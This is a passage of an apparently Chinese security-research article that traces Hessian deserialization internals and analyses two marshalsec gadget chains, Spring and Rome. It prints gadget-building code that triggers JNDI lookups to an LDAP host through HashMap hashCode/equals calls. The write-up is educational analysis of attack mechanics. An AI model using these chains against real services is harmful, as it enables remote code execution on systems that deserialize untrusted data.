deserialize result：Student(id=1,name=hessian,gender=null),cost time：43</pre>\n\n\n\n<p>通过这个测试可以简单看出Hessian反序列化占用的空间比JDK反序列化结果小，Hessian序列化时间比JDK序列化耗时长，但Hessian反序列化很快。并且两者都是基于Field机制，没有调用getter、setter方法，同时反序列化时构造方法也没有被调用。</p>\n\n\n\n<h4 id=\"hessian_1\">Hessian概念图</h4>\n\n\n\n<p>下面的是网络上对Hessian分析时常用的概念图，在新版中是整体也是这些结构，就直接拿来用了：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/9c004ebe-e855-4a35-9f22-29cca6ef6b1b.png-w331s\" alt=\"\" /></figure>\n\n\n\n<ul><li>Serializer：序列化的接口</li><li>Deserializer ：反序列化的接口</li><li>AbstractHessianInput ：hessian自定义的输入流，提供对应的read各种类型的方法</li><li>AbstractHessianOutput ：hessian自定义的输出流，提供对应的write各种类型的方法</li><li>AbstractSerializerFactory</li><li>SerializerFactory ：Hessian序列化工厂的标准实现</li><li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展</li><li>BeanSerializerFactory：对SerializerFactory的默认object的序列化机制进行强制指定，指定为使用BeanSerializer对object进行处理</li></ul>\n\n\n\n<p>Hessian Serializer/Derializer默认情况下实现了以下序列化/反序列化器，用户也可通过接口/抽象类自定义序列化/反序列化器：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/83ea1fea-0757-4ff9-9db5-08c8b581c654.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/3790a15f-3b71-4519-9207-93c7de4b8c47.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>序列化时会根据对象、属性不同类型选择对应的序列化其进行序列化；反序列化时也会根据对象、属性不同类型选择不同的反序列化器；每个类型序列化器中还有具体的FieldSerializer。这里注意下JavaSerializer/JavaDeserializer与BeanSerializer/BeanDeserializer，它们不是类型序列化/反序列化器，而是属于机制序列化/反序列化器：</p>\n\n\n\n<ol><li>JavaSerializer：通过反射获取所有bean的属性进行序列化，排除static和transient属性，对其他所有的属性进行递归序列化处理(比如属性本身是个对象)</li><li>BeanSerializer是遵循pojo bean的约定，扫描bean的所有方法，发现存在get和set方法的属性进行序列化，它并不直接直接操作所有的属性，比较温柔</li></ol>\n\n\n\n<h4 id=\"hessian_2\">Hessian反序列化过程</h4>\n\n\n\n<p>这里使用一个demo进行调试，在Student属性包含了String、int、List、Map、Object类型的属性，添加了各属性setter、getter方法，还有readResovle、finalize、toString、hashCode方法，并在每个方法中进行了输出，方便观察。虽然不会覆盖Hessian所有逻辑，不过能大概看到它的面貌：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">//people.java\npublic class People {\n    int id;\n    String name;\n\n    public int getId() {\n        System.out.println(&#34;Student getId call&#34;);\n        return id;\n    }\n\n    public void setId(int id) {\n        System.out.println(&#34;Student setId call&#34;);\n        this.id = id;\n    }\n\n    public String getName() {\n        System.out.println(&#34;Student getName call&#34;);\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(&#34;Student setName call&#34;);\n        this.name = name;\n    }\n}</pre>\n\n\n\n<pre class=\"crayon-plain-tag\">//Student.java\npublic class Student extends People implements Serializable {\n    private static final long serialVersionUID = 1L;\n\n    private static Student student = new Student(111, &#34;xxx&#34;, &#34;ggg&#34;);\n    private transient String gender;\n    private Map&#38;lt;String, Class&#38;lt;Object&#38;gt;&#38;gt; innerMap;\n    private List&#38;lt;Student&#38;gt; friends;\n\n    public void setFriends(List&#38;lt;Student&#38;gt; friends) {\n        System.out.println(&#34;Student setFriends call&#34;);\n        this.friends = friends;\n    }\n\n    public void getFriends(List&#38;lt;Student&#38;gt; friends) {\n        System.out.println(&#34;Student getFriends call&#34;);\n        this.friends = friends;\n    }\n\n\n    public Map getInnerMap() {\n        System.out.println(&#34;Student getInnerMap call&#34;);\n        return innerMap;\n    }\n\n    public void setInnerMap(Map innerMap) {\n        System.out.println(&#34;Student setInnerMap call&#34;);\n        this.innerMap = innerMap;\n    }\n\n    public String getGender() {\n        System.out.println(&#34;Student getGender call&#34;);\n        return gender;\n    }\n\n    public void setGender(String gender) {\n        System.out.println(&#34;Student setGender call&#34;);\n        this.gender = gender;\n    }\n\n    public Student() {\n        System.out.println(&#34;Student default constructor call&#34;);\n    }\n\n    public Student(int id, String name, String gender) {\n        System.out.println(&#34;Student custom constructor call&#34;);\n        this.id = id;\n        this.name = name;\n        this.gender = gender;\n    }\n\n    private void readObject(ObjectInputStream ObjectInputStream) {\n        System.out.println(&#34;Student readObject call&#34;);\n    }\n\n    private Object readResolve() {\n        System.out.println(&#34;Student readResolve call&#34;);\n\n        return student;\n    }\n\n    @Override\n    public int hashCode() {\n        System.out.println(&#34;Student hashCode call&#34;);\n        return super.hashCode();\n    }\n\n    @Override\n    protected void finalize() throws Throwable {\n        System.out.println(&#34;Student finalize call&#34;);\n\n        super.finalize();\n    }\n\n    @Override\n    public String toString() {\n        return &#34;Student{&#34; +\n                &#34;id=&#34; + id +\n                &#34;, name='&#34; + name + '\\'' +\n                &#34;, gender='&#34; + gender + '\\'' +\n                &#34;, innerMap=&#34; + innerMap +\n                &#34;, friends=&#34; + friends +\n                '}';\n    }\n}</pre>\n\n\n\n<pre class=\"crayon-plain-tag\">//SerialTest.java\npublic class SerialTest {\n\n    public static &#38;lt;T&#38;gt; byte[] serialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            HessianOutput output = new HessianOutput(os);\n            output.writeObject(t);\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n\n    public static &#38;lt;T&#38;gt; T deserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            HessianInput input = new HessianInput(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n\n    public static void main(String[] args) {\n        int id = 111;\n        String name = &#34;hessian&#34;;\n        String gender = &#34;boy&#34;;\n\n        Map innerMap = new HashMap&#38;lt;String, Class&#38;lt;Object&#38;gt;&#38;gt;();\n        innerMap.put(&#34;1&#34;, ObjectInputStream.class);\n        innerMap.put(&#34;2&#34;, SQLData.class);\n\n        Student friend = new Student(222, &#34;hessian1&#34;, &#34;boy&#34;);\n        List friends = new ArrayList&#38;lt;Student&#38;gt;();\n        friends.add(friend);\n\n        Student stu = new Student();\n        stu.setId(id);\n        stu.setName(name);\n        stu.setGender(gender);\n        stu.setInnerMap(innerMap);\n        stu.setFriends(friends);\n\n        System.out.println(&#34;---------------hessian serialize----------------&#34;);\n        byte[] obj = serialize(stu);\n        System.out.println(new String(obj));\n\n        System.out.println(&#34;---------------hessian deserialize--------------&#34;);\n        Student student = deserialize(obj);\n        System.out.println(student);\n    }\n}</pre>\n\n\n\n<p>下面是对上面这个demo进行调试后画出的Hessian在反序列化时处理的大致面貌（图片看不清，可以点<a href=\"https://www.processon.com/view/link/5c714c28e4b03334b5273bd6\">这个链接</a>查看）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/2f4b8860-daf1-493e-823a-ed931f37235d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>下面通过在调试到某些关键位置具体说明。</p>\n\n\n\n<h5 id=\"_2\">获取目标类型反序列化器</h5>\n\n\n\n<p>首先进入HessianInput.readObject()，读取tag类型标识符，由于Hessian序列化时将结果处理成了Map，所以第一个tag总是M(ascii 77)：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/6a0de531-9634-485b-82e5-9446689bff9b.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在<code>case 77</code>这个处理中，读取了要反序列化的类型，接着调用<code>this._serializerFactory.readMap(in,type)</code>进行处理，默认情况下serializerFactory使用的Hessian标准实现SerializerFactory：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/9f67b723-b0db-4b60-a45b-89607faef2b9.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>先获取该类型对应的Deserializer，接着调用对应Deserializer.readMap(in)进行处理，看下如何获取对应的Derserializer：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/424e007b-532f-4978-95ba-bcda0cc7edf8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/1777783f-47e2-499f-8801-75192e9e9184.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>第一个红框中主要是判断在<code>_cacheTypeDeserializerMap</code>中是否缓存了该类型的反序列化器；第二个红框中主要是判断是否在<code>_staticTypeMap</code>中缓存了该类型反序列化器，<code>_staticTypeMap</code>主要存储的是基本类型与对应的反序列化器；第三个红框中判断是否是数组类型，如果是的话则进入数组类型处理；第四个获取该类型对应的Class，进入<code>this.getDeserializer(Class)</code>再获取该类对应的Deserializer，本例进入的是第四个：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/cd49add1-41a1-4fb0-87d0-3b54c17ac379.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里再次判断了是否在缓存中，不过这次是使用的<code>_cacheDeserializerMap</code>，它的类型是<code>ConcurrentHashMap</code>，之前是<code>_cacheTypeDeserializerMap</code>，类型是<code>HashMap</code>，这里可能是为了解决多线程中获取的问题。本例进入的是第二个<code>this.loadDeserializer(Class)</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/a2dea15e-db9c-453b-be02-9e8e246c1c48.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/b072344d-c6ed-4ed5-bcf8-072527393516.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/96643489-6ac9-4f0f-964c-80d257b6124d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>第一个红框中是遍历用户自己设置的SerializerFactory，并尝试从每一个工厂中获取该类型对应的Deserializer；第二个红框中尝试从上下文工厂获取该类型对应的Deserializer；第三个红框尝试创建上下文工厂，并尝试获取该类型自定义Deserializer，并且该类型对应的Deserializer需要是类似<code>xxxHessianDeserializer</code>，xxx表示该类型类名；第四个红框依次判断，如果匹配不上，则使用<code>getDefaultDeserializer(Class)，</code>本例进入的是第四个：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/c7483297-c421-4aee-9f79-085f1fbede0c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><code>_isEnableUnsafeSerializer</code>默认是为true的，这个值的确定首先是根据<code>sun.misc.Unsafe</code>的theUnsafe字段是否为空决定，而<code>sun.misc.Unsafe</code>的theUnsafe字段默认在静态代码块中初始化了并且不为空，所以为true；接着还会根据系统属性<code>com.caucho.hessian.unsafe</code>是否为false，如果为false则忽略由<code>sun.misc.Unsafe</code>确定的值，但是系统属性<code>com.caucho.hessian.unsafe</code>默认为null，所以不会替换刚才的ture结果。因此，<code>_isEnableUnsafeSerializer</code>的值默认为true，所以上图默认就是使用的UnsafeDeserializer，进入它的构造方法。</p>\n\n\n\n<h5 id=\"_3\">获取目标类型各属性反序列化器</h5>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/388b27cf-c3e3-4b3b-995e-011d7a1ed3e9.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在这里获取了该类型所有属性并确定了对应得FieldDeserializer，还判断了该类型的类中是否存在ReadResolve()方法，先看类型属性与FieldDeserializer如何确定：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/749bc734-fa59-4a68-8349-cbef16fbb0bd.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/ef3560f9-7768-43fc-bd7a-f5d2ba3af1f3.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/4d693cde-92cd-4832-b2ab-569c108c1438.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>获取该类型以及所有父类的属性，依次确定对应属性的FIeldDeserializer，并且属性不能是transient、static修饰的属性。下面就是依次确定对应属性的FieldDeserializer了，在UnsafeDeserializer中自定义了一些FieldDeserializer。</p>\n\n\n\n<h5 id=\"readresolve\">判断目标类型是否定义了readResolve()方法</h5>\n\n\n\n<p>接着上面的UnsafeDeserializer构造器中，还会判断该类型的类中是否有<code>readResolve()</code>方法：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/5eff612d-dbeb-476e-97d6-60027fb1301c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过遍历该类中所有方法，判断是否存在<code>readResolve()</code>方法。</p>\n\n\n\n<p>好了，后面基本都是原路返回获取到的Deserializer，本例中该类使用的是UnsafeDeserializer，然后回到<code>SerializerFactory.readMap(in,type)</code>中，调用<code>UnsafeDeserializer.readMap(in)</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/551664cc-5b83-42a4-bc12-3ae0a2677bdc.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>至此，获取到了本例中<code>com.longofo.deserialize.Student</code>类的反序列化器<code>UnsafeDeserializer</code>，以各字段对应的FieldSerializer，同时在Student类中定义了<code>readResolve()</code>方法，所以获取到了该类的<code>readResolve()</code>方法。</p>\n\n\n\n<h5 id=\"_4\">为目标类型分配对象</h5>\n\n\n\n<p>接下来为目标类型分配了一个对象：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/d70447cb-8905-4264-b5cf-9339a1c07e47.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/b31fd03f-a17f-4955-b112-dd3ca941a5e4.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过<code>_unsafe.allocateInstance(classType)</code>分配该类的一个实例，该方法是一个<code>sun.misc.Unsafe</code>中的native方法，为该类分配一个实例对象不会触发构造器的调用，这个对象的各属性现在也只是赋予了JDK默认值。</p>\n\n\n\n<h5 id=\"_5\">目标类型对象属性值的恢复</h5>\n\n\n\n<p>接下来就是恢复目标类型对象的属性值：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/d481adcc-bdbf-4712-bb75-b76ddeb0f475.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>进入循环，先调用<code>in.readObject()</code>从输入流中获取属性名称，接着从之前确定好的<code>this._fieldMap</code>中匹配该属性对应的FieldDeserizlizer，然后调用匹配上的FieldDeserializer进行处理。本例中进行了序列化的属性有innerMap（Map类型）、name（String类型）、id（int类型）、friends（List类型），这里以innerMap这个属性恢复为例。</p>\n\n\n\n<h6 id=\"innermap\">以InnerMap属性恢复为例</h6>\n\n\n\n<p>innerMap对应的FieldDeserializer为<code>UnsafeDeserializer$ObjectFieldDeserializer</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/d50d45c8-0616-4dea-8058-17524a95a3c0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>首先调用<code>in.readObject(fieldClassType)</code>从输入流中获取该属性值，接着调用了<code>_unsafe.putObject</code>这个位于<code>sun.misc.Unsafe</code>中的native方法，并且不会触发getter、setter方法的调用。这里看下<code>in.readObject(fieldClassType)</code>具体如何处理的：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/b7cdb93b-acfd-45ea-8fe2-40ad37da7336.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里Map类型使用的是MapDeserializer，对应的调用<code>MapDeserializer.readMap(in)</code>方法来恢复一个Map对象：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/536bb80f-40f6-49fc-93b7-70059a9288a6.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/67911b32-817c-42b8-840d-19500d314a22.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>注意这里的几个判断，如果是Map接口类型则使用HashMap，如果是SortedMap类型则使用TreeMap，其他Map则会调用对应的默认构造器，本例中由于是Map接口类型，使用的是HashMap。接下来经典的场景就来了，先使用<code>in.readObject()</code>（这个过程和之前的类似，就不重复了）恢复了序列化数据中Map的key，value对象，接着调用了<code>map.put(key,value)</code>，这里是HashMap，在HashMap的put方法会调用<code>hash(key)</code>触发key对象的<code>key.hashCode()</code>方法，在put方法中还会调用putVal，putVal又会调用key对象的<code>key.equals(obj)</code>方法。处理完所有key，value后，返回到<code>UnsafeDeserializer$ObjectFieldDeserializer</code>中：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/feb02099-dcc4-4e07-881d-6ae766b652db.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>使用native方法<code>_unsafe.putObject</code>完成对象的innerMap属性赋值。</p>\n\n\n\n<h4 id=\"hessian_3\">Hessian的几条利用链分析</h4>\n\n\n\n<p>在marshalsec工具中，提供了对于Hessian反序列化可利用的几条链：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/21b5010e-58f5-4d4f-8e02-30c87a43f742.png-w331s\" alt=\"\" /></figure>\n\n\n\n<ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul>\n\n\n\n<p>下面分析其中的两条Rome和SpringPartiallyComparableAdvisorHolder，Rome是通过<code>HashMap.put</code>-&#62;<code>key.hashCode</code>触发，SpringPartiallyComparableAdvisorHolder是通过<code>HashMap.put</code>-&#62;<code>key.equals</code>触发。其他几个也是类似的，要么利用hashCode、要么利用equals。</p>\n\n\n\n<h5 id=\"springpartiallycomparableadvisorholder\">SpringPartiallyComparableAdvisorHolder</h5>\n\n\n\n<p>在marshalsec中有所有对应的Gadget Test，很方便：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/76dd1a62-0030-4de7-8390-b3ac88691965.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/ffb644e1-f24c-48f5-adcc-1777eb9b3909.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里将Hessian对SpringPartiallyComparableAdvisorHolder这条利用链提取出来看得比较清晰些：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">String jndiUrl = &#34;ldap://localhost:1389/obj&#34;;\nSimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();\nbf.setShareableResources(jndiUrl);\n\n//反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType-&#38;gt;SimpleJndiBeanFactory.doGetType-&#38;gt;SimpleJndiBeanFactory.doGetSingleton-&#38;gt;SimpleJndiBeanFactory.lookup-&#38;gt;JndiTemplate.lookup\nReflections.setFieldValue(bf, &#34;logger&#34;, new NoOpLog());\nReflections.setFieldValue(bf.getJndiTemplate(), &#34;logger&#34;, new NoOpLog());\n\n//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder\nAspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);\nReflections.setFieldValue(aif, &#34;beanFactory&#34;, bf);\nReflections.setFieldValue(aif, &#34;name&#34;, jndiUrl);\n\n//反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder\nAbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);\nReflections.setFieldValue(advice, &#34;aspectInstanceFactory&#34;, aif);\n\n//反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder\nAspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);\nReflections.setFieldValue(advisor, &#34;advice&#34;, advice);\n\n//反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString\nClass&#38;lt;?&#38;gt; pcahCl = Class.forName(&#34;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&#34;);\nObject pcah = Reflections.createWithoutConstructor(pcahCl);\nReflections.setFieldValue(pcah, &#34;advisor&#34;, advisor);\n\n//反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals\nHotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);\nHotSwappableTargetSource v2 = new HotSwappableTargetSource(Xstring(&#34;xxx&#34;));\n\n//反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。</pre>\n\n\n\n<pre class=\"crayon-plain-tag\">HashMap&#38;lt;Object, Object&#38;gt; s = new HashMap&#38;lt;&#38;gt;();\nReflections.setFieldValue(s, &#34;size&#34;, 2);\nClass&#38;lt;?&#38;gt; nodeC;\ntry {\n    nodeC = Class.forName(&#34;java.util.HashMap$Node&#34;);\n}\ncatch ( ClassNotFoundException e ) {\n    nodeC = Class.forName(&#34;java.util.HashMap$Entry&#34;);\n}\nConstructor&#38;lt;?&#38;gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);\nnodeCons.setAccessible(true);\n\nObject tbl = Array.newInstance(nodeC, 2);\nArray.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));\nArray.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));\nReflections.setFieldValue(s, &#34;table&#34;, tbl);</pre>\n\n\n\n<p>看以下触发流程：</p>\n\n\n\n<p>经过<code>HessianInput.readObject()</code>，到了<code>MapDeserializer.readMap(in)</code>进行处理Map类型属性，这里触发了<code>HashMap.put(key,value)</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/f30cba3b-4b38-482b-8833-5c06b63d9539.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><code>HashMap.put</code>有调用了<code>HashMap.putVal</code>方法，第二次put时会触发<code>key.equals(k)</code>方法：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/788eed7c-a7c5-40a9-a8ad-8ecaeef41d87.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>此时key与k分别如下，都是HotSwappableTargetSource对象：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/a211eac5-cd73-4401-ad71-a8f3161e756d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>进入<code>HotSwappableTargetSource.equals</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/7fda9bf8-e4e0-425e-bd49-097977c3d5d1.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在<code>HotSwappableTargetSource.equals</code>中又触发了各自<code>target.equals</code>方法，也就是<code>XString.equals(PartiallyComparableAdvisorHolder)</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/e17e9d81-839e-4078-a6a7-1ee5212b88db.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在这里触发了<code>PartiallyComparableAdvisorHolder.toString</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/2f67ddf5-a3dc-4932-94ed-c2e6da674c78.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>发了<code>AspectJPointcutAdvisor.getOrder</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/98a7d3bd-61ba-4977-b2cc-42506d591d0f.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>触发了<code>AspectJAroundAdvice.getOrder</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/d6673c56-8548-4026-be42-c2fecff76c5c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里又触发了<code>BeanFactoryAspectInstanceFactory.getOrder</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/886e58b7-c7bb-483b-9c3c-5436eecafc5f.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>又触发了<code>SimpleJndiBeanFactory.getTYpe</code>-&#62;<code>SimpleJndiBeanFactory.doGetType</code>-&#62;<code>SimpleJndiBeanFactory.doGetSingleton</code>-&#62;<code>SimpleJndiBeanFactory.lookup</code>-&#62;<code>JndiTemplate.lookup</code>-&#62;<code>Context.lookup</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/1a6ed295-a594-4599-8a84-cf6ed6ac03d7.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/915c0c41-748b-4b0b-9e69-5364d9363807.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"rome\">Rome</h5>\n\n\n\n<p>Rome相对来说触发过程简单些：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/2e9ff77d-da4d-407f-ab7f-da8c6970c119.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>同样将利用链提取出来：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">//反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData-&#38;gt;JdbcRowSetImpl.connect-&#38;gt;Context.lookup\nString jndiUrl = &#34;ldap://localhost:1389/obj&#34;;\nJdbcRowSetImpl rs = new JdbcRowSetImpl();\nrs.setDataSourceName(jndiUrl);\nrs.setMatchColumn(&#34;foo&#34;);\n\n//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString\nToStringBean item = new ToStringBean(JdbcRowSetImpl.class, obj);\n\n//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode-&#38;gt;EqualsBean.beanHashCode\nEqualsBean root = new EqualsBean(ToStringBean.class, item);\n\n//HashMap.put-&#38;gt;HashMap.putVal-&#38;gt;HashMap.hash\nHashMap&#38;lt;Object, Object&#38;gt; s = new HashMap&#38;lt;&#38;gt;();\nReflections.setFieldValue(s, &#34;size&#34;, 2);\nClass&#38;lt;?&#38;gt; nodeC;\ntry {\n    nodeC = Class.forName(&#34;java.util.HashMap$Node&#34;);\n}\ncatch ( ClassNotFoundException e ) {\n    nodeC = Class.forName(&#34;java.util.HashMap$Entry&#34;);\n}\nConstructor&#38;lt;?&#38;gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);\nnodeCons.setAccessible(true);\n\nObject tbl = Array.newInstance(nodeC, 2);\nArray.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));\nArray.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));\nReflections.setFieldValue(s, &#34;table&#34;, tbl);</pre>\n\n\n\n<p>看下触发过程：</p>\n\n\n\n<p>经过<code>HessianInput.readObject()</code>，到了<code>MapDeserializer.readMap(in)</code>进行处理Map类型属性，这里触发了<code>HashMap.put(key,value)</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/157bdb00-8427-4db7-92fe-38d62ecfeb17.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>接着调用了hash方法，其中调用了<code>key.hashCode</code>方法：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/ed8c53cf-66fb-4b4e-b337-84d9e7f15818.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/7c4c5cc2-14d2-4108-9c7c-297af12edea8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>接着触发了<code>EqualsBean.hashCode-&#62;EqualsBean.beanHashCode</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/5cae5229-0b1f-422f-99b6-78fe62f4acaf.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>触发了<code>ToStringBean.toString</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/7dedee9c-36ec-4ba3-a096-e637cc1b0e3a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里调用了<code>JdbcRowSetImpl.getDatabaseMetadata</code>，其中又触发了<code>JdbcRowSetImpl.connect</code>-&#62;<code>context.lookup</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/78c26a65-90da-4d8d-b354-f6d2c44f926f.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 